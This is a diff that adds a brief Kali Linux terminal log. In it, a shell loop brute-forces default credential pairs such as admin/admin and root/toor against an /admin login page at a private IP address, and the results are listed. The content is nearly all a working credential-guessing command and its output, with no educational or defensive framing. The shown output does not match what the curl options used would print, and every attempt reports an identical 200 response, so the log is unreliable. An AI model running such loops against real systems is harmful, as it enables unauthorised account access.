@@ -1,0 +1,5 @@
+kali@kali:~$ for user in admin root administrator; do for pw in admin admin123 toor P@ssw0rd; do curl -sv -d "username=$user&password=$pw" http://10.47.153.65:8080/admin -o /dev/null -w '%{http_code}\n'; done; done
+< POST /admin HTTP/1.1  ->  200 (2944 bytes)   [username=admin password=admin]
+< POST /admin HTTP/1.1  ->  200 (2944 bytes)   [username=admin password=admin123]
+< POST /admin HTTP/1.1  ->  200 (2944 bytes)   [username=root password=toor]
+< POST /admin HTTP/1.1  ->  200 (2944 bytes)   [username=administrator password=P@ssw0rd]
